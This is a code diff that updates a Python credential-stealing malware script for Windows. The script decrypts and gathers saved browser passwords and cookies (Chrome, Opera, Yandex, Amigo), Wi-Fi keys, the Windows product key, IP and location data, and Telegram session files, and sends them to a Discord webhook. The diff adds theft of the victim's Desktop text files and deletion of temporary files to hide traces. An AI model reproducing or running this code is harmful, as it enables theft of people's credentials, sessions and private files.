@@ -1,25 +1,18 @@
-
-from os import system
-from sqlite3.dbapi2 import Timestamp
-import subprocess
-from xml.dom import minidom
-
 try:
     import shutil
     import json
+    import datetime
     from base64 import b64decode
-    from glob import glob
-    import sys
     import win32crypt
     from dhooks import Webhook, Embed, File
     from win32crypt import CryptUnprotectData
-    from datetime import datetime
     from windows_tools.installed_software import *
     from Crypto.Cipher import AES
     import os
     import sqlite3
+    import platform
+    from hurry.filesize import size
     from uuid import getnode as get_mac
-    import re
     from requests import get
     import win32api
     import win32com.shell.shell as shell
@@ -41,6 +34,7 @@ embed = Embed(
 embed.set_footer(text='Hehe')
 hook.send(embed=embed)
 
+from sqlite3.dbapi2 import Timestamp
 from windows_tools.product_key import *
 
 PRODUCT_KEY_REGEX = r'([A-Z0-9]{5}-){4}[A-Z0-9]{5}'
@@ -52,9 +46,11 @@ result = get_installed_software()
 f = open('installed_soft.txt', 'w')
 f.write(str(result))
 f.close()
+pathusr = os.path.expanduser('~')
+pathusr2 = pathusr.replace("\\", "/")
 file = File('installed_soft.txt', name="installed_softwares.txt")
 embed = Embed(
-    description=f'Windows key: {reg_key}',
+    description=f'Windows key: {reg_key}\nWinSoft ↓\nUsername: {pathusr}\nOS: {platform.system()} {platform.release()}',
     color=0x5CDBF0,
     timestamp='now'  
     )
@@ -66,7 +62,7 @@ os.remove('installed_soft.txt')
 name_ur_txt = 'google_passwords.txt'
 ######################################################################## IP ########################################################
 ip_info = "################## IP INFO ##################\n\n"
-publicip = get('https://api.ipify.org').text # Get public API
+publicip = get('https://api.ipify.org').text#get('http://ipgrab.io').text
 ip_info += f"#### ip: {publicip} ####\n"
 city = get(f'https://ipapi.co/{publicip}/city').text
 ip_info += f"### city: {city} ####\n"
@@ -96,12 +92,10 @@ embed = Embed(
     )
 hook.send(embed=embed)
 ####################################################################################################################################
-
-pathusr = os.path.expanduser('~')
 local = os.getenv("LOCALAPPDATA")
 temp = os.path.join(local, "Temp")
 ttemp = os.path.join(local, "Temp", "tdata")
-paths = ['C:\\', 'D:\\', 'E:\\', 'F:\\', 'G:\\', 'H:\\', 'I:\\', 'J:\\']
+paths = ['C:\\', 'D:\\', 'E:\\', 'F:\\', 'G:\\', 'H:\\', 'I:\\', 'J:\\', 'K:\\', 'L:\\', 'M:\\', 'N:\\', 'O:\\', 'P:\\', 'Q:\\', 'R:\\', 'S:\\']
 path = os.path.expandvars(r'%LocalAppData%\Google\Chrome\User Data\Local State')
 
 ############################ getting master key #########################
@@ -223,6 +217,7 @@ embed = Embed(
     timestamp='now'  
     )
 hook.send(embed=embed, file=cookies)
+os.remove(os.getenv("APPDATA") + '\\pass_opera.txt')
 
 ###################################################################
 
@@ -252,6 +247,7 @@ embed = Embed(
     timestamp='now'  
     )
 hook.send(embed=embed, file=cookies)
+os.remove(os.getenv("APPDATA") + '\\yandex_cookies.txt')
 
 ####################################################################
 
@@ -259,22 +255,16 @@ hook.send(embed=embed, file=cookies)
 import zipfile
 pwds = os.system("netsh wlan export profile key=clear")
 os.system('cls')
-# for filenames in os.listdir(os.getcwd()):
-#     if filenames.endswith('.xml'):
-#         shutil.make_archive(os.getcwd(), 'zip', dir_name)
 zf = zipfile.ZipFile("passwords.zip", "w")
 for dirname, subdirs, files in os.walk(os.getcwd()):
-    #zf.write(dirname)
     for filename in files:
         if filename.endswith('.xml'):
             zf.write(os.path.join(dirname, filename))
 zf.close()
 for dirname, subdirs, files in os.walk(os.getcwd()):
-    #zf.write(dirname)
     for filename in files:
         if filename.endswith('.xml'):
             os.remove(filename)
-import platform
 file = File('passwords.zip', name='wifi-passwords.zip')
 embed = Embed(
     title = "WIFI Passwords",
@@ -284,22 +274,44 @@ embed = Embed(
 hook.send(embed=embed)
 hook.send(file=file)
 os.remove('passwords.zip')
+
+########################## TXT FILES ########################
+def get_file_size(file_path):
+    size = os.path.getsize(file_path)
+    return size
+zf = zipfile.ZipFile("txt_files.zip", "w")
+for dirname, subdirs, files in os.walk(pathusr2+'/Desktop'):
+    for filename in files:
+        if filename.endswith('.txt') and size(get_file_size(filename)) != "10M":
+            zf.write(filename)
+zf.close()
+file = File("txt_files.zip", name="txt_files_from_victim.zip")
+embed = Embed(
+    title="TXT Files",
+    description=f'Txt files from {pathusr}',
+    color=0x5CDBF0,
+    timestamp='now'  
+    )
+hook.send(embed=embed)
+hook.send(file=file)
+os.remove("txt_files.zip")
+
 ########################## Amigo ###############################
 
 def Amigo():
-   textam = 'Passwords Amigo:' + '\n'
-   textam += 'URL | LOGIN | PASSWORD' + '\n'
-   if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Amigo\\User Data\\Default\\Login Data'):
-       shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Amigo\\User Data\\Default\\Login Data', os.getenv("LOCALAPPDATA") + '\\Amigo\\User Data\\Default\\Login Data2')
-       conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Amigo\\User Data\\Default\\Login Data2')
-       cursor = conn.cursor()
-       cursor.execute('SELECT action_url, username_value, password_value FROM logins')
-       for result in cursor.fetchall():
-           password = win32crypt.CryptUnprotectData(result[2])[1].decode()
-           login = result[1]
-           url = result[0]
-           if password != '':
-               textam += url + ' | ' + login + ' | ' + password + '\n'
+    textam = 'Passwords Amigo:' + '\n'
+    textam += 'URL | LOGIN | PASSWORD' + '\n'
+    if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Amigo\\User Data\\Default\\Login Data'):
+        shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Amigo\\User Data\\Default\\Login Data', os.getenv("LOCALAPPDATA") + '\\Amigo\\User Data\\Default\\Login Data2')
+        conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Amigo\\User Data\\Default\\Login Data2')
+        cursor = conn.cursor()
+        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
+        for result in cursor.fetchall():
+            password = win32crypt.CryptUnprotectData(result[2])[1].decode()
+            login = result[1]
+            url = result[0]
+            if password != '':
+                textam += url + ' | ' + login + ' | ' + password + '\n'
 file = open(os.getenv("APPDATA") + '\\amigo_pass.txt', "w+")
 file.write(str(Amigo()) + '\n')
 file.close()
@@ -311,21 +323,22 @@ embed = Embed(
     timestamp='now'  
     )
 hook.send(embed=embed, file=cookies)
+os.remove(os.getenv("APPDATA") + '\\amigo_pass.txt')
 
 def Amigo_c():
-   textamc = 'Cookies Amigo:' + '\n'
-   textamc += 'URL | COOKIE | COOKIE NAME' + '\n'
-   if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Amigo\\User Data\\Default\\Cookies'):
-       shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Amigo\\User Data\\Default\\Cookies', os.getenv("LOCALAPPDATA") + '\\Amigo\\User Data\\Default\\Cookies2')
-       conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Amigo\\User Data\\Default\\Cookies2')
-       cursor = conn.cursor()
-       cursor.execute("SELECT * from cookies")
-       for result in cursor.fetchall():
-           cookie = win32crypt.CryptUnprotectData(result[12])[1].decode()
-           name = result[2]
-           url = result[1]
-           textamc += url + ' | ' + str(cookie) + ' | ' + name + '\n'
-   return textamc
+    textamc = 'Cookies Amigo:' + '\n'
+    textamc += 'URL | COOKIE | COOKIE NAME' + '\n'
+    if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Amigo\\User Data\\Default\\Cookies'):
+        shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Amigo\\User Data\\Default\\Cookies', os.getenv("LOCALAPPDATA") + '\\Amigo\\User Data\\Default\\Cookies2')
+        conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Amigo\\User Data\\Default\\Cookies2')
+        cursor = conn.cursor()
+        cursor.execute("SELECT * from cookies")
+        for result in cursor.fetchall():
+            cookie = win32crypt.CryptUnprotectData(result[12])[1].decode()
+            name = result[2]
+            url = result[1]
+            textamc += url + ' | ' + str(cookie) + ' | ' + name + '\n'
+    return textamc
 
 file = open(os.getenv("APPDATA") + '\\amigo_cookies.txt', "w+")
 file.write(str(Amigo_c()) + '\n')
@@ -338,6 +351,8 @@ embed = Embed(
     timestamp='now'  
     )
 hook.send(embed=embed, file=cookies)
+os.remove(os.getenv("APPDATA") + '\\amigo_cookies.txt')
+
 #################################################################
 
 ################################# Telegram Session ###############################
@@ -369,9 +384,8 @@ def send_session_files(path):
     version = getFileProperties(os.path.join(path[:-5],"Telegram.exe"))["FileVersion"]
     try:
         os.mkdir(ttemp)
-        print("good")
     except:
-        print("err")
+        pass
     for root, dirs, files in os.walk(path):
         for dir in dirs:
             if dir[0:15] == "D877F783D5D3EF8":
@@ -437,15 +451,13 @@ def send_session_files(path):
     )
     hook.send(embed=embed)
     hook.send(file=file)
-    return False
 
 if os.path.exists(pathusr + '\\AppData\\Roaming\\Telegram Desktop'):
     tddir = (pathusr + '\\AppData\\Roaming\\Telegram Desktop\\')
     tdata_path = (pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata')
-    print("***OK Default TG folder has been found")
     send_session_files(tdata_path)
 else:
-    print("ERROR: Telegram folder is not default. Continuing...")
+    pass
 
 
 for i in paths:
